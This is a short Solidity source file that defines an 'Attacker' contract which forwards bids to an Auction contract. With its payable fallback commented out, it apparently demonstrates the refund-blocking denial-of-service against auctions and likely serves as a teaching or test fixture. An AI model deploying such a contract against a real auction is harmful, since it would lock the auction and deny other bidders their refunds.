pragma solidity 0.4.24;

import "./Auction.sol";


contract Attacker {
    Auction public auction;

    constructor(address _auction) public {
        require(_auction != address(0));

        auction = Auction(_auction);
    }

    // function() public payable {
    // }

    function bid() public payable {
        auction.bid.value(msg.value)();
    }
}
